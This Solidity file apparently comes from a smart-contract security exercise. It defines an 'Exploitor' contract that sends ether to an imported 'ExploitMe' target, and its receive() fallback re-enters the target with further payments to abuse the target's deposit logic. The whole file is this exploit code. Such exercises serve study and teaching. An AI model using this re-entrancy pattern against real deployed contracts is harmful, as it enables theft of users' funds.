//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.11;

import "./ExploitMe.sol";
import "hardhat/console.sol";

contract Exploitor {

    ExploitMe exploitMe;

    constructor (address payable _exploitMeAddress) public {
        exploitMe = ExploitMe(_exploitMeAddress);
    }

    function depositTricky() payable external virtual {
        (bool success, ) = address(exploitMe).call{value: 0.7 ether }("");
        require(success, "ETH SEND FAILED");
        console.log("\tdepositAnyAmount...1");

        (success, ) = address(exploitMe).call{value: 0.7 ether }("");
        require(success, "ETH SEND FAILED");
        console.log("\tdepositAnyAmount...2");

    }

    receive() external payable {
        console.log("\tExploitor receiving...ETH.", msg.value/1e18);

        (bool success, ) = address(exploitMe).call{value: 0.3 ether }("");
        require(success, "ETH SEND FAILED");
        console.log("\tTrick ! depositAnyAmount...1"); 
    }
}